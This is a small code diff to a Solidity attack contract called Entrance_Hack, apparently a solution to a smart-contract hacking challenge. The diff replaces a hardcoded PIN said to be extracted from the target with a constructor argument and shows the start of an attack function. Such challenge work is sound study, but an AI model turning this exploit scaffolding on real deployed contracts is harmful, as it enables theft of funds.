@@ -9,9 +9,9 @@ contract Entrance_Hack {
   Entrance entrance;
   uint count = 0;
 
-  constructor (address a) public {
+  constructor (address a, uint256 pin) public {
     entrance = Entrance(a);
-    entrance.enter(12341111); //Pin extracted from contract
+    entrance.enter(pin); //Pin extracted from contract
   }
 
   function attack () public { //Call me to trigger attack
